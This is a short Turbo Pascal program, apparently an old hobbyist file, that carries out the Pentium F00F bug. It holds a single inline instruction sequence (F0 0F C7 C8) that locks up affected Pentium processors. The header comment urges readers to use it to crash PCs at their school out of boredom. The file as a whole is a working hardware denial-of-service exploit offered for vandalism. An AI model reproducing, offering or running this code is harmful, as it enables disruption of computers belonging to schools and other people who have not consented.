{ f00f.pas - Pentium F00F bug - Sigma <sigma@mail.com>
------------------------------------------------------

My pascal inplementation of the Pentium f00f bug.
Use it to crash PCs with turbo pascal at your school when
you have nothing better to do. }

program f00f_bug;
begin
     inline($F0/$0F/$C7/$C8);
end.